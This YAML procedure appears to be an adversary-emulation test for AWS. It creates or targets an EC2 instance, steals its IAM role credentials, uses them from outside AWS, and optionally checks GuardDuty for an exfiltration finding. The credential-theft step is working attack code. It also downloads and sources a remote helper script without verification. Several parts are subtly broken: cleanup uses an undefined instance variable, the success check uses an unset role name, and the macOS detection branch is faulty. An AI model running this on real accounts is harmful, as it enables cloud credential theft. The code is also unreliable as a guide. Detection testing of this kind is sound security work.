---
name: exfil-instance-profile-creds
description: |
  This script is designed to exfiltrate AWS IAM role credentials associated with
  an EC2 instance. It achieves this by performing the following tasks:

  1. Ensuring AWS credentials and the AWS CLI are present.
  2. Creating an EC2 instance and stealing the associated IAM role's credentials.
  3. Validating the stolen credentials by running them on a non-AWS system.
  4. Optionally, executing cleanup actions.
  5. Optionally, checking for detection of unauthorized access within a
     specific time window using AWS GuardDuty.
args:
  - name: cleanup
  - name: detect
  - name: target_instance
    default: "NOP"

steps:
  - name: ensure-aws-creds-present
    inline: |
      set -e

      if [[ -z "${AWS_DEFAULT_REGION}" ]]; then
          echo "Error: AWS_DEFAULT_REGION must be set."
          exit 1
      fi

      if [[ -n "${AWS_ACCESS_KEY_ID}" && -n "${AWS_SECRET_ACCESS_KEY}" ]]; then
          if [[ -z "${AWS_SESSION_TOKEN}" ]]; then
            echo "Warning: AWS_SESSION_TOKEN is not set with AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY."
          fi
      elif [[ -z "${AWS_PROFILE}" ]]; then
          echo "Error: AWS credentials are not set, exiting."
          exit 1
      fi

  - name: ensure-aws-cli-present
    inline: |
      set -e

      if ! [ -x "$(command -v aws)" ]; then
        echo 'Error: AWS CLI is not installed.' >&2
      else
        echo -e "AWS CLI is installed: $(aws --version)"
      fi

  - name: create-an-instance-or-use-target-instance-and-steal-profile
    inline: |
      set -e

      # Define the URL of aws
      aws_url="https://raw.githubusercontent.com/l50/dotfiles/main/aws"

      # Define the local path of aws
      aws_path="/tmp/aws"

      # Check if aws exists locally
      if [[ ! -f "${aws_path}" ]]; then
          # aws.sh doesn't exist locally, so download it
          curl -s "${aws_url}" -o "${aws_path}"
      fi

      # Source aws
      # shellcheck source=/dev/null
      source "${aws_path}"

      if [[ "{{args.target_instance}}" != "NOP" ]]; then
        INSTANCE_ID="{{args.target_instance}}"
        echo "Using target instance ID: $INSTANCE_ID"
      else
        # Find the default VPC and subnet
        VPC_ID=$(find_default_vpc)
        DEFAULT_SUBNET_ID=$(find_default_subnet)

        # Get latest AMI ID
        AMI_ID=$(get_latest_ami "ubuntu" "22.04" "amd64")
        export AMI_ID

        INSTANCE_TYPE=t3.micro
        export INSTANCE_TYPE

        IAM_INSTANCE_PROFILE=AmazonSSMInstanceProfileForInstances
        export IAM_INSTANCE_PROFILE

        INSTANCE_NAME="exfil-instance-profile-creds"
        export INSTANCE_NAME

        INSTANCE_ID=$(create_ec2_instance $AMI_ID $INSTANCE_TYPE \
            $IAM_INSTANCE_PROFILE $INSTANCE_NAME $SECURITY_GROUP_NAME \
            $SECURITY_GROUP_DESC $VPC_ID $DEFAULT_SUBNET_ID)
      fi

      export INSTANCE_ID

      # Wait for instance to be running
      instance=$(find_instance name "${INSTANCE_NAME}")

      # Fetch role credentials
      CREDENTIALS=$(get_instance_role_credentials "${INSTANCE_ID}")

      # Parse the JSON output to fetch AWS_ACCESS_KEY_ID,
      # AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN
      AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | jq -r .AccessKeyId)
      export AWS_ACCESS_KEY_ID
      AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | jq -r .SecretAccessKey)
      export AWS_SECRET_ACCESS_KEY
      AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | jq -r .Token)
      export AWS_SESSION_TOKEN

      # Confirm role was stolen successfully (run locally)
      aws sts get-caller-identity --no-cli-pager

      # Get caller identity
      CALLER_IDENTITY=$(aws sts get-caller-identity --no-cli-pager)

      # Extract the Arn field
      CALLER_ARN=$(echo "$CALLER_IDENTITY" | jq -r .Arn)

      # Check if the Arn contains the expected role
      if [[ $CALLER_ARN == *"/$ROLE_NAME"* ]]; then
          echo "Successfully stole instance profile credentials and ran them on a non-AWS system!"
      else
          echo "Failed to steal instance profile credentials."
          exit 1
      fi

    cleanup:
      inline: |
        set -e

        if [[ "{{args.cleanup}}" == true ]]; then
          INSTANCE_NAME="exfil-instance-profile-creds"
          export INSTANCE_NAME
          instance_to_terminate=$(find_instance name "$INSTANCE_NAME")

          if [ -z "$instance_to_terminate" ]; then
              echo "No instances to terminate."
          else
              terminate_instance "$instance_id"
          fi

          delete_security_group
        fi

  - name: check-detection
    inline: |
      set -e

      if [ "{{args.detect}}" == true ]; then
        current_time() {
            date -u +'%Y-%m-%dT%H:%M:%SZ'
        }

        ten_minutes_ago() {
            if [[ "$OSTYPE" == "darwin"* ]]; then
                date -v-10M -u +'%Y-%m-%dT%H:%M:%SZ'
            else
                date -u -d '10 minutes ago' +'%Y-%m-%dT%H:%M:%SZ'
            fi
        }

        # Define a time window for AWS GuardDuty
        START_TIME=$(ten_minutes_ago)
        END_TIME=$(current_time)

        # The finding type to look for
        FINDING_TYPE="UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS"

        DETECTORS=$(aws guardduty list-detectors --output json)
        DETECTOR_IDS=$(echo "$DETECTORS" | jq -r '.DetectorIds[]')

        for DETECTOR_ID in $DETECTOR_IDS; do
            FINDINGS=$(aws guardduty list-findings --detector-id "$DETECTOR_ID" --output json)
            FINDING_IDS=$(echo "$FINDINGS" | jq -r '.FindingIds[]')

            if [[ -z "$FINDING_IDS" ]]; then
                echo "No $FINDING_TYPE event detected in the last 10 minutes"
            else
                for FINDING_ID in $FINDING_IDS; do
                    FINDING=$(aws guardduty get-findings --detector-id "$DETECTOR_ID" --finding-ids "$FINDING_ID" --output json)
                    UPDATED_AT=$(echo "$FINDING" | jq -r '.Findings[0].UpdatedAt')

                    if [[ "$OSTYPE" == "darwin"* ]]; then
                        if [[ $(date -j -f '%Y-%m-%dT%H:%M:%SZ' "$END_TIME" +%s 2> /dev/null) -gt $(date -j -f '%Y-%m-%dT%H:%M:%SZ' "$START_TIME" +%s 2> /dev/null) ]]; then
                            echo "UnauthorizedAccess finding detected!"
                        fi
                    else
                        # Linux
                        if [[ $(date -u -d "$UPDATED_AT" +%s 2> /dev/null) -gt $(date -u -d "$START_TIME" +%s 2> /dev/null) ]] \
                            && [[ $(date -u -d "$UPDATED_AT" +%s 2> /dev/null) -lt $(date -u -d "$END_TIME" +%s 2> /dev/null) ]]; then
                            echo -e "UnauthorizedAccess finding detected!"
                        fi
                    fi
                done
            fi
        done
      fi
